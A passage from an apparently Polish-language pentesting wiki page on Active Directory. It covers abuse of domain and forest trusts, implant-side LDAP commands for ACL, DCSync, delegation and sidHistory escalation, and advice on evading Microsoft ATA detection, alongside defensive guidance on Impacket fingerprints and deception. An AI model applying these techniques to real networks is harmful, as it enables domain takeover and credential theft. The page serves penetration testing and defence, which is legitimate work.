W tym scenariuszu **Twoja domena jest obdarzona zaufaniem** przez domenę zewnętrzną, co daje Ci **nieokreślone uprawnienia** w tej domenie. Musisz ustalić, **które podmioty z Twojej domeny mają jakie uprawnienia** w domenie zewnętrznej, a następnie spróbować je wykorzystać:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Zewnętrzna domena lasu — jednokierunkowe (wychodzące)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

W tym scenariuszu **twoja domena** **ufa** principalowi z **innej domeny**, przyznając mu określone **uprawnienia**.

Jednak gdy **domena jest zaufana** przez domenę ufającą, zaufana domena **tworzy użytkownika** o **przewidywalnej nazwie**, używając **hasła domeny zaufanej** jako hasła użytkownika. Oznacza to, że można **uzyskać dostęp do użytkownika z domeny ufającej, aby dostać się do domeny zaufanej**, wyliczyć jej zasoby i spróbować eskalować uprawnienia:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Innym sposobem na przejęcie zaufanej domeny jest znalezienie [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) utworzonego w **kierunku przeciwnym** do relacji zaufania domen (co nie zdarza się często).

Innym sposobem na przejęcie zaufanej domeny jest poczekanie na maszynie, do której **użytkownik z zaufanej domeny może uzyskać dostęp**, aby zalogować się przez **RDP**. Następnie atakujący może wstrzyknąć kod do procesu sesji RDP i stamtąd **uzyskać dostęp do domeny źródłowej ofiary**.\
Co więcej, jeśli **ofiara zamontowała swój dysk twardy**, atakujący może za pośrednictwem procesu **sesji RDP** umieścić **backdoors** w **folderze autostartu na dysku twardym**. Ta technika nazywa się **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Ograniczanie nadużyć związanych z relacjami zaufania domen

### **SID Filtering:**

- Ryzyko ataków wykorzystujących atrybut SID history w ramach relacji zaufania między lasami ogranicza SID Filtering, który jest domyślnie aktywny dla wszystkich relacji zaufania między lasami. Opiera się to na założeniu, że relacje zaufania wewnątrz lasu są bezpieczne, ponieważ zgodnie ze stanowiskiem Microsoft granicą bezpieczeństwa jest las, a nie domena.
- Jest jednak pewien haczyk: SID filtering może zakłócać działanie aplikacji i dostęp użytkowników, co sprawia, że czasami jest wyłączany.

### **Selective Authentication:**

- W przypadku relacji zaufania między lasami użycie Selective Authentication gwarantuje, że użytkownicy z obu lasów nie są automatycznie uwierzytelniani. Zamiast tego użytkownicy muszą otrzymać jawne uprawnienia, aby uzyskać dostęp do domen i serwerów w domenie lub lesie ufającym.
- Należy pamiętać, że te środki nie chronią przed wykorzystaniem zapisywalnego Configuration Naming Context (NC) ani przed atakami na konto relacji zaufania.

[**Więcej informacji o relacjach zaufania domen w ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Nadużycia AD oparte na LDAP z implantów działających na hoście

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) ponownie implementuje prymitywy LDAP w stylu bloodyAD jako x64 Beacon Object Files, które działają w całości wewnątrz implantu na hoście (np. Adaptix C2). Operatorzy kompilują pakiet poleceniem `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, ładują `ldap.axs`, a następnie wywołują `ldap <subcommand>` z poziomu beacona. Cały ruch korzysta z bieżącego kontekstu zabezpieczeń logowania przez LDAP (389) z podpisywaniem/szyfrowaniem lub przez LDAPS (636) z automatycznym zaufaniem do certyfikatu, więc nie są potrzebne proxy SOCKS ani artefakty na dysku.<sup>[[4]](#references)</sup>

### Wyliczanie LDAP po stronie implantu

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` i `get-groupmembers` rozwiązują krótkie nazwy/ścieżki OU do pełnych DN i zrzucają odpowiadające im obiekty.
- `get-object`, `get-attribute` i `get-domaininfo` pobierają dowolne atrybuty (w tym deskryptory zabezpieczeń), a także metadane lasu/domeny z `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` i `get-rbcd` udostępniają bezpośrednio z LDAP kandydatów do roasting, ustawienia delegowania oraz istniejące deskryptory [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` i `get-writable --detailed` analizują DACL, aby wyświetlić podmioty uprawnione, prawa (GenericAll/WriteDACL/WriteOwner/zapisywanie atrybutów) i dziedziczenie, wskazując bezpośrednie cele eskalacji uprawnień przez ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Prymitywy zapisu LDAP do eskalacji i persistence

- BOF-y do tworzenia obiektów (`add-user`, `add-computer`, `add-group`, `add-ou`) pozwalają operatorowi przygotować nowe podmioty lub konta komputerów w dowolnym miejscu, w którym istnieją uprawnienia do OU. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` umożliwiają bezpośrednie przejęcie celów, gdy zostaną znalezione uprawnienia do zapisu właściwości.
- Polecenia skupione na ACL, takie jak `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync`, zamieniają WriteDACL/WriteOwner na dowolnym obiekcie AD w możliwość resetowania haseł, kontrolowania członkostwa w grupach lub uzyskania uprawnień replikacji DCSync — bez pozostawiania artefaktów PowerShell/ADSI. Odpowiedniki `remove-*` usuwają wstrzyknięte ACE.

### Delegacja, roasting i nadużycia Kerberos

- `add-spn`/`set-spn` natychmiast umożliwiają Kerberoasting przejętego użytkownika; `add-asreproastable` (zmiana UAC) oznacza go jako podatnego na AS-REP roasting bez zmiany hasła.
- Makra delegacji (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) modyfikują `msDS-AllowedToDelegateTo`, flagi UAC lub `msDS-AllowedToActOnBehalfOfOtherIdentity` z poziomu beacona, umożliwiając ścieżki ataku z delegacją constrained/unconstrained/RBCD i eliminując potrzebę korzystania ze zdalnego PowerShell lub RSAT.

### Wstrzykiwanie sidHistory, przenoszenie obiektów OU i kształtowanie powierzchni ataku

- `add-sidhistory` wstrzykuje uprzywilejowane SID-y do historii SID kontrolowanego podmiotu (zob. [Wstrzykiwanie SID-History](sid-history-injection.md)), zapewniając dyskretne dziedziczenie dostępu w całości przez LDAP/LDAPS.
- `move-object` zmienia DN/OU komputerów lub użytkowników, pozwalając atakującemu przenieść zasoby do OU, w których istnieją już delegowane uprawnienia, a następnie nadużyć `set-password`, `add-groupmember` lub `add-spn`.
- Precyzyjnie ograniczone polecenia usuwania (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` itd.) umożliwiają szybkie wycofanie zmian po zebraniu poświadczeń lub ustanowieniu persistence, minimalizując ilość telemetrii.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Ogólne metody obrony

[**Dowiedz się więcej o ochronie poświadczeń.**](../stealing-credentials/credentials-protections.md)

### **Środki ochrony poświadczeń**

- **Ograniczenia dotyczące Domain Admins**: Zaleca się, aby Domain Admins mogli logować się wyłącznie na kontrolerach domeny, a nie na innych hostach.
- **Uprawnienia kont usług**: Usługi nie powinny działać z uprawnieniami Domain Admin (DA), aby zachować bezpieczeństwo.
- **Ograniczenie czasu przyznania uprawnień**: Czas wykonywania zadań wymagających uprawnień DA powinien być ograniczony. Można to osiągnąć za pomocą: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Ograniczanie LDAP relay**: Przeprowadź audyt identyfikatorów zdarzeń 2889/3074/3075, a następnie wymuś podpisywanie LDAP i channel binding LDAPS na kontrolerach domeny/klientach, aby blokować próby LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Odciski protokołów aktywności Impacket

Aby wykrywać typowe techniki stosowane w AD, **nie polegaj wyłącznie na artefaktach kontrolowanych przez operatora**, takich jak zmienione nazwy plików binarnych, nazwy usług, tymczasowe pliki batch czy ścieżki wynikowe. Ustal wzorce ruchu generowanego przez legalne klienty Windows przy obsłudze [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC i WMI, a następnie szukaj **osobliwości implementacji**, które pozostają widoczne nawet po zmodyfikowaniu przez operatora plików `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` lub `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Kandydaci o wysokim poziomie pewności, wykrywani samodzielnie** (po zweryfikowaniu względem własnego wzorca):
  - Uwierzytelnione DCE/RPC z `auth_context_id = 79231 + ctx_id`
  - Wypełnienie dopełnienia uwierzytelniania DCE/RPC bajtami `0xff`
  - Uwierzytelnianie Kerberos LDAP, w którym surowe `AP-REQ` Kerberos trafia bezpośrednio do `mechToken` SPNEGO
  - Żądania negotiate SMB2/3 z wartościami `ClientGuid` przypominającymi tekst ASCII
  - `WMI IWbemLevel1Login::NTLMLogin` używające niestandardowej przestrzeni nazw `//./root/cimv2`
  - Zakodowane na stałe wartości nonce Kerberos
- **Lepsze jako cechy korelacji/punktacji**:
  - Rzadkie lub zduplikowane listy etype Kerberos, nietypowe/brakujące `PA-DATA` albo kolejność etype w TGS-REQ różniąca się od natywnego Windows
  - Komunikaty NTLM Type 1 bez informacji o wersji lub komunikaty Type 3 z pustymi nazwami hostów
  - Surowy NTLMSSP przesyłany przez DCE/RPC zamiast SPNEGO, brakujące znaczniki weryfikacyjne DCE/RPC albo niezgodności OID SPNEGO/Kerberos
  - Kilka takich cech z tego samego hosta/użytkownika/sesji/przedziału czasu jest znacznie bardziej wiarygodnych niż pojedyncze, słabe pole
- **Używaj jako dodatkowego kontekstu, nie jako samodzielnych alertów**:
  - Domyślne nazwy plików, ścieżki wynikowe, losowe nazwy usług, tymczasowe nazwy plików batch, domyślne nazwy kont komputerów oraz charakterystyczne dla narzędzi ciągi HTTP/WebDAV/RDP/MSSQL
  - Operatorzy mogą je łatwo zmienić; najlepiej wykorzystać je do wyjaśnienia, dlaczego klaster obejmujący wiele protokołów jest podejrzany
- **Uwagi operacyjne**:
  - Niektóre z tych sygnałów wymagają odszyfrowanego ruchu, parsowania [PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW lub widoczności po stronie usługi
  - Przed przekształceniem ich w alerty zweryfikuj je w odniesieniu do klientów Samba/Linux, urządzeń i starszego oprogramowania
  - W miarę wzrostu pewności co do wzorca rozwijaj detekcje etapami: dodatkowy kontekst -> threat hunting -> alertowanie

### **Wdrażanie technik deception**

- Wdrażanie deception polega na zastawianiu pułapek, takich jak użytkownicy lub komputery-przynęty, z cechami takimi jak niewygasające hasła lub ustawienie flagi Trusted for Delegation. Szczegółowe podejście obejmuje tworzenie użytkowników o określonych uprawnieniach lub dodawanie ich do grup o wysokich uprawnieniach.<sup>[[2]](#references)</sup>
- Praktyczny przykład wykorzystania narzędzi: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Więcej informacji o wdrażaniu technik deception można znaleźć w [Deploy-Deception na GitHubie](https://github.com/samratashok/Deploy-Deception).

### **Identyfikowanie deception**

- **Obiekty użytkowników**: Podejrzane wskaźniki obejmują nietypowy ObjectSID, rzadkie logowania, daty utworzenia i niską liczbę nieudanych prób podania hasła.
- **Ogólne wskaźniki**: Porównanie atrybutów potencjalnych obiektów-przynęt z atrybutami prawdziwych obiektów może ujawnić niespójności. Narzędzia takie jak [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogą pomóc w wykrywaniu takich pułapek.

### **Omijanie systemów wykrywania**

- **Omijanie detekcji Microsoft ATA**:
  - **Enumeracja użytkowników**: Unikanie enumeracji sesji na kontrolerach domeny, aby zapobiec wykryciu przez ATA.
  - **Podszywanie się przy użyciu ticketów**: Wykorzystanie kluczy **aes** do tworzenia ticketów pomaga uniknąć wykrycia, ponieważ nie następuje downgrade do NTLM.
  - **Ataki DCSync**: Zaleca się ich wykonywanie z hosta innego niż kontroler domeny, aby uniknąć wykrycia przez ATA, ponieważ bezpośrednie wykonanie na kontrolerze domeny wywoła alerty.

## References

- [1] [Przewodnik po atakowaniu relacji zaufania domen](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Fałszowanie relacji zaufania na potrzeby deception w Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Od Domain Admin do Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Zbiór LDAP BOF – zestaw narzędzi LDAP działający w pamięci do eksploatacji Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Wykorzystanie hashy NTLM jako wordlisty](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Piraci](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – analiza Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: przejmowanie kont Active Directory przez Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Jak zarządzać zmianami w połączeniach bezpiecznego kanału Netlogon związanymi z CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Podróż przez zapomniane interfejsy Null Session i MS-RPC](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Czy filtr SID stanowi granicę bezpieczeństwa między domenami? (Część 4) - Badanie omijania filtrowania SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Czy filtr SID stanowi granicę bezpieczeństwa między domenami? (Część 5) - Atak na relację zaufania Golden GMSA — z domeny podrzędnej do nadrzędnej](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Czy filtr SID stanowi granicę bezpieczeństwa między domenami? (Część 6) - Atak na relację zaufania przez zmianę schematu — z domeny podrzędnej do nadrzędnej](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Od DA do EA z ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Eskalacja od administratorów domeny podrzędnej do Enterprise Admins w 5 minut przez nadużycie AD CS — kontynuacja](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [As w rękawie: projektowanie backdoorów DACL w Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Kod źródłowy modułu pre2k NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - atrybut msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
